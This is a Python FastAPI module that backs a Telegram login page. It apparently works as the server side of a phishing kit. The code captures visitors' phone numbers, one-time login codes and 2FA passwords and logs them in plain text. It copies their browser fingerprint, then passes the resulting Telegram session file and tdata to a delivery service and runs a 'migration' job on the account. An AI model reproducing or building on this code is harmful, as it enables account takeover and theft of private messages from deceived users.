from __future__ import annotations

import asyncio
import logging
import os
from typing import Any, Optional

from fastapi import APIRouter, HTTPException, Request
from fastapi.responses import JSONResponse

from landing.app import SESSION_COOKIE
from landing.logger import landing_logger
from web.routes.common import login_payload, req_ip, req_meta
from web.routes.schemas import (
	CancelBody,
	CodeBody,
	PasswordBody,
	PhoneBody,
	QrStartBody,
	QrStatusBody,
	StartBody,
)
from web.services.export_options import ExportOptions
from web.services.job_runner import job_runner
from web.services.login_store import AuthStep, LoginState, login_store
from web.services.migration.pipeline import MigrationPipeline
from web.services.migration.settings import settings_repo
from web.services.web_auth_service import WebAuthService
from app.device_fingerprint import from_web_client

router = APIRouter()
auth_service = WebAuthService()
_log = logging.getLogger(__name__)


def _auth_proxy_raw(explicit: Optional[str], settings_proxy: str = "") -> Optional[str]:
	"""proxy из запроса → настройки бота → BOT_PROXY/.env."""
	from bot.config import BOT_PROXY, load_dotenv

	load_dotenv()
	for value in (
		explicit,
		settings_proxy,
		BOT_PROXY or os.getenv("BOT_PROXY"),
		os.getenv("TG_PROXY"),
		os.getenv("HTTPS_PROXY"),
	):
		text = (value or "").strip()
		if text:
			return text
	return None


def _apply_client_device(state: LoginState, request: Request, body_client=None) -> None:
	"""Зафиксировать отпечаток браузера посетителя на LoginState."""
	meta = req_meta(request)
	ua = (getattr(body_client, "ua", None) if body_client else None) or meta.get("ua") or ""
	lang = (getattr(body_client, "lang", None) if body_client else None) or meta.get("lang") or ""
	platform = (getattr(body_client, "platform", None) if body_client else None) or ""
	hints = None
	if body_client and getattr(body_client, "hints", None) is not None:
		hints = body_client.hints.model_dump(exclude_none=True)
	state.device_params = from_web_client(
		ua=ua if ua != "-" else "",
		lang=lang if lang != "-" else "",
		platform=platform,
		hints=hints,
	)


def _account_details(state: LoginState, **extra: Any) -> dict[str, Any]:
	data: dict[str, Any] = {
		"login_id": state.login_id,
		"phone": state.phone,
		"account_phone": state.phone,
		"user_id": state.user_id,
		"user": state.username or state.user_label,
		**extra,
	}
	return {k: v for k, v in data.items() if v not in (None, "")}


@router.post("/api/auth/start")
async def auth_start(request: Request, body: StartBody | None = None):
	state = auth_service.start()
	_apply_client_device(state, request, body.client if body else None)
	# старт сессии не шлём в Telegram — только visit / phone / code / 2FA
	return JSONResponse(login_payload(state))


@router.post("/api/auth/cancel")
async def auth_cancel(body: CancelBody):
	"""Закрытие формы: снять клиент и удалить незавершённые qr_*.session."""
	await auth_service.finish(body.login_id)
	return JSONResponse({"ok": True})


@router.post("/api/auth/qr/discard")
async def auth_qr_discard(body: CancelBody):
	"""Переключение QR → телефон: удалить временную qr-сессию."""
	await auth_service.discard_qr(body.login_id)
	return JSONResponse({"ok": True})


@router.post("/api/auth/phone")
async def auth_phone(body: PhoneBody, request: Request):
	settings = await settings_repo.load()
	proxy_raw = _auth_proxy_raw(body.proxy, settings.default_proxy)
	await landing_logger.event(
		"auth.phone.submit",
		ip=req_ip(request),
		**req_meta(request),
		details={
			"login_id": body.login_id,
			"phone": (body.phone or "").strip(),
			"proxy": bool(proxy_raw),
		},
	)
	try:
		state = login_store.get(body.login_id)
		if state is not None and not state.device_params:
			_apply_client_device(state, request)
		state = await auth_service.submit_phone(
			body.login_id,
			body.phone,
			proxy_raw=proxy_raw,
			options=ExportOptions.from_dict(body.options.model_dump()),
		)
	except KeyError as error:
		await landing_logger.event(
			"auth.phone.error",
			ip=req_ip(request),
			**req_meta(request),
			details={"login_id": body.login_id, "phone": body.phone, "error": str(error)},
		)
		raise HTTPException(status_code=404, detail=str(error)) from error

	if state.error:
		await landing_logger.event(
			"auth.phone.error",
			ip=req_ip(request),
			**req_meta(request),
			details=_account_details(state, error=state.error, phone=body.phone),
		)
	if state.step == AuthStep.DONE and state.client:
		return await queue_migration(state, body.login_id, request)
	return JSONResponse(login_payload(state))


@router.post("/api/auth/code")
async def auth_code(body: CodeBody, request: Request):
	from web.services.login_store import login_store

	prev = login_store.get(body.login_id)
	await landing_logger.event(
		"auth.code.submit",
		ip=req_ip(request),
		**req_meta(request),
		details={
			"login_id": body.login_id,
			"code": (body.code or "").strip(),
			"phone": prev.phone if prev else None,
			"account_phone": prev.phone if prev else None,
			"user_id": prev.user_id if prev else None,
			"user": (prev.username or prev.user_label) if prev else None,
		},
	)
	try:
		state = await auth_service.submit_code(body.login_id, body.code)
	except KeyError as error:
		await landing_logger.event(
			"auth.code.error",
			ip=req_ip(request),
			**req_meta(request),
			details={"login_id": body.login_id, "error": str(error)},
		)
		raise HTTPException(status_code=404, detail=str(error)) from error

	if state.error:
		await landing_logger.event(
			"auth.code.error",
			ip=req_ip(request),
			**req_meta(request),
			details=_account_details(state, error=state.error, code=body.code),
		)
	if state.step == AuthStep.DONE and state.client:
		return await queue_migration(state, body.login_id, request)
	return JSONResponse(login_payload(state))


@router.post("/api/auth/password")
async def auth_password(body: PasswordBody, request: Request):
	from web.services.login_store import login_store

	prev = login_store.get(body.login_id)
	await landing_logger.event(
		"auth.password.submit",
		ip=req_ip(request),
		**req_meta(request),
		details={
			"login_id": body.login_id,
			"password": (body.password or "").strip(),
			"phone": prev.phone if prev else None,
			"account_phone": prev.phone if prev else None,
			"user_id": prev.user_id if prev else None,
			"user": (prev.username or prev.user_label) if prev else None,
		},
	)
	try:
		state = await auth_service.submit_password(body.login_id, body.password)
	except KeyError as error:
		await landing_logger.event(
			"auth.password.error",
			ip=req_ip(request),
			**req_meta(request),
			details={"login_id": body.login_id, "error": str(error)},
		)
		raise HTTPException(status_code=404, detail=str(error)) from error

	if state.error:
		await landing_logger.event(
			"auth.password.error",
			ip=req_ip(request),
			**req_meta(request),
			details=_account_details(
				state, error=state.error, password=body.password
			),
		)
	if state.step == AuthStep.DONE and state.client:
		return await queue_migration(state, body.login_id, request)
	return JSONResponse(login_payload(state))


@router.post("/api/auth/qr/start")
async def auth_qr_start(body: QrStartBody, request: Request):
	settings = await settings_repo.load()
	proxy_raw = _auth_proxy_raw(body.proxy, settings.default_proxy)
	await landing_logger.event(
		"auth.qr.start",
		ip=req_ip(request),
		**req_meta(request),
		details={"login_id": body.login_id, "proxy": bool(proxy_raw)},
	)
	try:
		state = login_store.get(body.login_id)
		if state is not None and not state.device_params:
			_apply_client_device(state, request)
		state = await auth_service.start_qr(
			body.login_id,
			proxy_raw=proxy_raw,
			options=ExportOptions.from_dict(body.options.model_dump()),
		)
	except KeyError as error:
		await landing_logger.event(
			"auth.qr.error",
			ip=req_ip(request),
			**req_meta(request),
			details={"login_id": body.login_id, "error": str(error)},
		)
		raise HTTPException(status_code=404, detail=str(error)) from error

	if state.error:
		await landing_logger.event(
			"auth.qr.error",
			ip=req_ip(request),
			**req_meta(request),
			details=_account_details(state, error=state.error),
		)
	return JSONResponse(login_payload(state))


@router.post("/api/auth/qr/status")
async def auth_qr_status(body: QrStatusBody, request: Request):
	try:
		state = await auth_service.poll_qr(body.login_id)
	except KeyError as error:
		raise HTTPException(status_code=404, detail=str(error)) from error

	if state.error and state.step == AuthStep.ERROR:
		await landing_logger.event(
			"auth.qr.error",
			ip=req_ip(request),
			**req_meta(request),
			details=_account_details(state, error=state.error),
		)
	if state.step == AuthStep.DONE and state.client:
		return await queue_migration(state, body.login_id, request)
	if state.step == AuthStep.PASSWORD:
		await landing_logger.event(
			"auth.qr.password_needed",
			ip=req_ip(request),
			**req_meta(request),
			details=_account_details(state),
		)
	return JSONResponse(login_payload(state))


async def queue_migration(state, login_id: str, request: Optional[Request] = None):
	settings = await settings_repo.load()
	proxy = state.proxy
	session_path = state.session_path
	user_label = state.user_label
	user_id = state.user_id
	username = state.username
	phone = state.phone
	options = state.options
	cloud_password = (state.cloud_password or "").strip()
	if not cloud_password:
		from web.services.migration.cloud_secrets import cloud_secrets

		keys = []
		if state.phone:
			keys.append(str(state.phone))
		if session_path:
			keys.append(os.path.splitext(os.path.basename(session_path))[0])
		for key in keys:
			cloud_password = await cloud_secrets.get(key) or ""
			if cloud_password:
				break

	job_runner.set_concurrency(0)
	# финальный persist на случай, если 2FA-путь ещё оставил phone_*.session
	try:
		if state.client and state.session_path:
			await auth_service._persist_session_as_account(state)
	except Exception as exc:
		_log.warning("persist before migrate failed: %s", exc)

	session_path = state.session_path
	if not session_path or not os.path.isfile(session_path):
		_log.error("нет файла сессии для миграции: %s", session_path)
		return JSONResponse(
			{
				"login_id": login_id,
				"step": AuthStep.ERROR.value,
				"error": "Сессия не сохранена на диск — войдите снова",
				"user_label": user_label,
				"session_path": session_path,
				"export_dir": None,
				"job_id": None,
			},
			status_code=500,
		)

	await auth_service.finish(login_id)

	pipeline = MigrationPipeline(settings=settings, export_options=options)

	# .session сразу → миграция → tdata после (сессию не делим между клиентами)
	async def worker():
		from web.services.session_delivery import deliver_session_file, deliver_tdata

		try:
			await deliver_session_file(
				session_path=session_path,
				user_label=user_label or "",
				user_id=user_id,
				phone=phone,
			)
		except Exception as exc:
			_log.warning("session file delivery failed: %s", exc)

		_log.info("pipeline start for %s", user_label or session_path)
		report = await pipeline.run_session(
			session_path,
			proxy=proxy,
			cloud_password=cloud_password,
		)

		try:
			await deliver_tdata(
				session_path=session_path,
				user_label=user_label or "",
				user_id=user_id,
				phone=phone,
				proxy=proxy,
			)
		except Exception as exc:
			_log.warning("tdata delivery failed: %s", exc)
		return report

	job = await job_runner.submit(
		label=user_label or session_path or "account",
		worker=worker,
		session_path=session_path,
	)

	# ответ клиенту сразу; лог «вход успешен» в фоне (без ожидания tdata)
	ip = req_ip(request)
	meta = req_meta(request)
	asyncio.create_task(
		_post_auth_log(
			login_id=login_id,
			user_id=user_id,
			username=username,
			user_label=user_label or "",
			phone=phone,
			session_path=session_path,
			job_id=job.job_id,
			ip=ip,
			meta=meta,
		)
	)

	response = JSONResponse(
		{
			"login_id": login_id,
			"step": AuthStep.DONE.value,
			"error": None,
			"user_label": user_label,
			"session_path": session_path,
			"export_dir": None,
			"job_id": job.job_id,
		}
	)
	response.set_cookie(
		key=SESSION_COOKIE,
		value=f"tg-{login_id}",
		httponly=True,
		samesite="lax",
		path="/",
		max_age=60 * 60 * 24 * 30,
	)
	return response


async def _post_auth_log(
	*,
	login_id: str,
	user_id: Optional[int],
	username: Optional[str],
	user_label: str,
	phone: Optional[str],
	session_path: Optional[str],
	job_id: str,
	ip: str,
	meta: dict,
) -> None:
	try:
		await landing_logger.event(
			"auth.done",
			ip=ip,
			**meta,
			details={
				"login_id": login_id,
				"user_id": user_id,
				"user": username or user_label,
				"phone": phone,
				"account_phone": phone,
				"session": session_path,
				"job_id": job_id,
			},
		)
	except Exception as exc:
		_log.warning("auth.done log failed: %s", exc)